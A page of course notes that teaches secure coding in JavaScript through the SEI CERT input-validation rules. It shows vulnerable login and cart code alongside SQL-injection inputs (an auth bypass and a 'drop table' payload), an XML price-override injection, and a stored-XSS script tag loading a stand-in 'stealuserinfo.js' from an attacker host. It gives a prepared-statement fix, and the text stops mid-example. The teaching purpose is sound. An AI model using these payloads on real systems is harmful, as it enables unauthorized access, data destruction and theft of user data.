
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.3">
    
    
      
        <title>50.003 - Code Standards - Elements of Software Construction 50.003</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.50c56a3b.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    <body dir="ltr">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#50003-code-standards" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Elements of Software Construction 50.003" class="md-header__button md-logo" aria-label="Elements of Software Construction 50.003" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Elements of Software Construction 50.003
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              50.003 - Code Standards
            
          </span>
        </div>
      </div>
    </div>
    
    
      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Elements of Software Construction 50.003" class="md-nav__button md-logo" aria-label="Elements of Software Construction 50.003" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Elements of Software Construction 50.003
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Home
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../l1_course_handout/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Handout
  </span>
  

      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#learning-outcomes" class="md-nav__link">
    <span class="md-ellipsis">
      Learning Outcomes
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#coding-standard" class="md-nav__link">
    <span class="md-ellipsis">
      Coding Standard
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sei-cert-java-coding-standard" class="md-nav__link">
    <span class="md-ellipsis">
      SEI CERT Java Coding Standard
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SEI CERT Java Coding Standard">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#input-validation-and-data-sanitization" class="md-nav__link">
    <span class="md-ellipsis">
      Input Validation and Data Sanitization
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Input Validation and Data Sanitization">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ids00-j-sanitize-untrusted-data-passed-across-a-trust-boundary" class="md-nav__link">
    <span class="md-ellipsis">
      IDS00-J. Sanitize untrusted data passed across a trust boundary
    </span>
  </a>
  
    <nav class="md-nav" aria-label="IDS00-J. Sanitize untrusted data passed across a trust boundary">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sql-injection" class="md-nav__link">
    <span class="md-ellipsis">
      SQL Injection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xml-injection" class="md-nav__link">
    <span class="md-ellipsis">
      XML Injection
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ids01-j-normalize-strings-before-validating-them" class="md-nav__link">
    <span class="md-ellipsis">
      IDS01-J. Normalize strings before validating them
    </span>
  </a>
  
    <nav class="md-nav" aria-label="IDS01-J. Normalize strings before validating them">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#cross-site-scripting" class="md-nav__link">
    <span class="md-ellipsis">
      Cross Site Scripting
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-regex-to-sanitze-input" class="md-nav__link">
    <span class="md-ellipsis">
      Using Regex to sanitze input
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Using Regex to sanitze input">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#matching-a-single-expression" class="md-nav__link">
    <span class="md-ellipsis">
      Matching a single expression
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#matching-a-single-expression-globally" class="md-nav__link">
    <span class="md-ellipsis">
      Matching a single expression globally
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#case-insensitivity" class="md-nav__link">
    <span class="md-ellipsis">
      Case insensitivity
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#anchored-match" class="md-nav__link">
    <span class="md-ellipsis">
      Anchored match
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#character-class-match" class="md-nav__link">
    <span class="md-ellipsis">
      Character class match
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kleenes-star" class="md-nav__link">
    <span class="md-ellipsis">
      Kleene's star
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reference-group" class="md-nav__link">
    <span class="md-ellipsis">
      Reference group
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#more-on-repetition" class="md-nav__link">
    <span class="md-ellipsis">
      More on repetition
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pitfall-of-using-regex-as-input-sanitzer" class="md-nav__link">
    <span class="md-ellipsis">
      Pitfall of using Regex as input sanitzer
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h1 id="50003-code-standards">50.003 - Code Standards</h1>
<h2 id="learning-outcomes">Learning Outcomes</h2>
<p>By the end  of this unit, you should be able to </p>
<ol>
<li>Apply SEI CERT Java Coding Standard to improve security level of a software system</li>
</ol>
<h2 id="coding-standard">Coding Standard</h2>
<p>Coding standard is a common guideline for a group of software engineers to follows so as to </p>
<ol>
<li>have a uniform structure of most of the codes</li>
<li>improve readability </li>
<li>improve referenceability </li>
<li>improve maintainability</li>
<li>minimize exploitability</li>
</ol>
<p>Example, we find </p>
<ul>
<li>https://google.github.io/styleguide/</li>
<li>https://wiki.sei.cmu.edu/confluence/display/java/SEI+CERT+Oracle+Coding+Standard+for+Java</li>
</ul>
<h2 id="sei-cert-java-coding-standard">SEI CERT Java Coding Standard</h2>
<p>Let's take SEI CERT Java Coding Standard as an example.
It consists of a set of rules which are meant to provide normative requirements for code. Each rule is associated with a metrics for severity (low, medium, and high), likelihood (unlikely, probably, and likely) and remediation cost (high, medium, and low). Conformance to the rule can be determined through automated analysis (either static or dynamic), formal methods, or manual inspection techniques.</p>
<p>For example, we find a subset of the rules as follows,</p>
<ul>
<li>Input valuation and data sanitization</li>
<li>Object-orientation (not related for now since we focus on JavaScript). But you are strongly encouraged to read up.</li>
<li>Locking and thread-safety (we've covered in some earlier unit in week 6.)</li>
<li>Visibility and atomicity (not covered in this course)</li>
</ul>
<p>Although these coding standards are set for Java and our main language for the module is JavaScript, we will discuss those are applicable to both languages.</p>
<h3 id="input-validation-and-data-sanitization">Input Validation and Data Sanitization</h3>
<p>Many programs accept untrusted data originating from unvalidated users, network connections, and other untrusted sources and then pass the (modified or unmodified) data across a trust boundary to a different trusted domain. Such data must be sanitized. </p>
<p>For example, we find the following rules in this category</p>
<ol>
<li>IDS00-J. Sanitize untrusted data passed across a trust boundary</li>
<li>IDS01-J. Normalize strings before validating them</li>
<li>IDS11-J. Eliminate non-character code points before validation</li>
</ol>
<h4 id="ids00-j-sanitize-untrusted-data-passed-across-a-trust-boundary">IDS00-J. Sanitize untrusted data passed across a trust boundary</h4>
<p>The main idea is simple, given data provided by 3rd party, we should perform some sanitization to ensure the data is not malicious. </p>
<h5 id="sql-injection">SQL Injection</h5>
<p>An example of such data is SQL injection.</p>
<p>Suppose, we have the following code</p>
<div class="language-js highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kd">function</span><span class="w"> </span><span class="nx">login</span><span class="p">(</span><span class="nx">db</span><span class="p">,</span><span class="w"> </span><span class="nx">un</span><span class="p">,</span><span class="w"> </span><span class="nx">pw</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="p">[</span><span class="nx">rows</span><span class="p">,</span><span class="w"> </span><span class="nx">fieldDefs</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">db</span><span class="p">.</span><span class="nx">pool</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="sb">`</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="sb">            SELECT * FROM db_user WHERE username=&#39;</span><span class="si">${</span><span class="nx">un</span><span class="si">}</span><span class="sb">&#39; AND password=&#39;</span><span class="si">${</span><span class="nx">pw</span><span class="si">}</span><span class="sb">&#39; </span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="sb">        `</span><span class="p">);</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">found</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">rows</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">        </span><span class="nx">found</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">found</span><span class="p">;</span>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="p">}</span>
</span></code></pre></div>
<p>Function <code>login</code> takes a database connection object <code>con</code>, the username <code>un</code> and password <code>pw</code> and try to search for the user record in the <code>db_user</code> table. 
Note that <code>un</code> and <code>pw</code> are input strings povided by external parties, normal users and malicious users. 
A malicious user might set <code>un</code> to <code>""</code> and <code>pw</code> to <code>"' OR '0'='0"</code>
the query becomes </p>
<p><div class="language-sql highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">db_user</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span></code></pre></div>
which always return all the records from the <code>db_user</code> table. As a result, the user can login without giving a user name and password.</p>
<p>In the worst situation, a malicious user could give the following input <code>un = ""</code> and <code>pw = "'; drop table db_user; --"</code>, the query becomes</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">db_user</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="w"> </span><span class="k">drop</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">db_user</span><span class="p">;</span><span class="w"> </span><span class="c1">--&#39;</span>
</span></code></pre></div>
<p>As a result, all the records in the <code>db_user</code> are deleted. </p>
<p>To prevent SQL injection attacks, a <em>Prepared Statement</em> should be used.</p>
<div class="language-js highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="kd">function</span><span class="w"> </span><span class="nx">login</span><span class="p">(</span><span class="nx">db</span><span class="p">,</span><span class="w"> </span><span class="nx">un</span><span class="p">,</span><span class="w"> </span><span class="nx">pw</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="p">[</span><span class="nx">rows</span><span class="p">,</span><span class="w"> </span><span class="nx">fieldDefs</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">db</span><span class="p">.</span><span class="nx">pool</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="sb">`</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="sb">            SELECT * FROM db_user WHERE username= ? AND password= ? </span>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="sb">        `</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nx">un</span><span class="p">,</span><span class="w"> </span><span class="nx">pw</span><span class="p">]);</span>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">found</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">rows</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="w">        </span><span class="nx">found</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">found</span><span class="p">;</span>
</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="p">}</span>
</span></code></pre></div>
<p>In the updated version above, we use an overloaded <code>query()</code> to define a prepared statement. to manage the query. The <code>?</code> placeholders allow the programmers to indicate where the untrusted input should be inserted after being sanitized. Via the prepared statement, we sanitize the untrusted input strings before inserting them into the statement.</p>
<h5 id="xml-injection">XML Injection</h5>
<p>Besides SQL injection, untrusted XML data fragment imposes threats  to the system security too. </p>
<p>Consider the following JavaScript program </p>
<p><div class="language-js highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="kd">function</span><span class="w"> </span><span class="nx">addIPhone</span><span class="p">(</span><span class="nx">qty</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">doc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`&lt;item&gt;</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="sb">        &lt;description&gt;iPhone X&lt;/description&gt;</span>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="sb">        &lt;price&gt;999.0&lt;/price&gt; </span>
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="sb">        &lt;quantity&gt;</span><span class="si">${</span><span class="nx">qty</span><span class="si">}</span><span class="sb">&lt;/quantity&gt; </span>
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="sb">        &lt;/item&gt;`</span><span class="p">;</span>
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="w">    </span><span class="nx">addToCart</span><span class="p">(</span><span class="nx">doc</span><span class="p">);</span>
</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="p">}</span>
</span></code></pre></div>
when a normal user invokes the above function with <code>qty = "1"</code>, the resulting
XML document </p>
<div class="language-xml highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nt">&lt;item&gt;</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">    </span><span class="nt">&lt;description&gt;</span>iPhone<span class="w"> </span>X<span class="nt">&lt;/description&gt;</span>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">    </span><span class="nt">&lt;price&gt;</span>999.0<span class="nt">&lt;/price&gt;</span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">    </span><span class="nt">&lt;quantity&gt;</span>1<span class="nt">&lt;/quantity&gt;</span>
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="nt">&lt;/item&gt;</span>
</span></code></pre></div>
<p>which captures the user's shopping item, will be process by <code>addToCart()</code> function.</p>
<p>Suppose a malicious user invokes the function with a rigged input <code>qty = "1&lt;/quantity&gt;&lt;price&gt;1.0&lt;/price&gt;&lt;quantity&gt;1"</code> which results in the following XML document </p>
<p><div class="language-xml highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nt">&lt;item&gt;</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">    </span><span class="nt">&lt;description&gt;</span>iPhone<span class="w"> </span>X<span class="nt">&lt;/description&gt;</span>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">    </span><span class="nt">&lt;price&gt;</span>999.0<span class="nt">&lt;/price&gt;</span>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">    </span><span class="nt">&lt;quantity&gt;</span>1<span class="nt">&lt;/quantity&gt;</span>
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="w">    </span><span class="nt">&lt;price&gt;</span>1<span class="nt">&lt;/price&gt;</span>
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="w">    </span><span class="nt">&lt;quantity&gt;</span>1<span class="nt">&lt;/quantity&gt;</span>
</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="nt">&lt;/item&gt;</span>
</span></code></pre></div>
If the <code>addToCart()</code> method processes the elements top-to-bottom in order, it might override the price value <code>999.0</code> by <code>1</code>.</p>
<p>The fix to this issue is similar to the one for SQL injection. What is required is to santize the input string before embedding into the XML template which is used as a trusted data. </p>
<h3 id="ids01-j-normalize-strings-before-validating-them">IDS01-J. Normalize strings before validating them</h3>
<h5 id="cross-site-scripting">Cross Site Scripting</h5>
<p>The third example of security loop holes caused by using untrusted data in the trusted context is Cross Site Scripting.</p>
<p>Consider the following app</p>
<div class="language-js highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dbmodel</span><span class="p">.</span><span class="nx">getOne</span><span class="p">();</span>
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span>
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="w">        </span><span class="sb">`&lt;div&gt; the message is &lt;/div&gt; &lt;div&gt; </span><span class="si">${</span><span class="nx">msg</span><span class="si">}</span><span class="sb"> &lt;/div&gt;`</span>
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="w">    </span><span class="p">);</span>
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="p">})</span>
</span></code></pre></div>
<p>Suppose the message created by some normal user and recored in the database is <code>"hello"</code>. The above route handler returns</p>
<div class="language-html highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span> the message is <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span> hello <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></code></pre></div>
<p>However the threat surfaces when the message retrieved from the database is 
<code>"&lt;script src='http://hacker-network.io/stealuserinfo.js' type='javascript'&gt;&lt;/script&gt; "</code> as the resulting html document becomes</p>
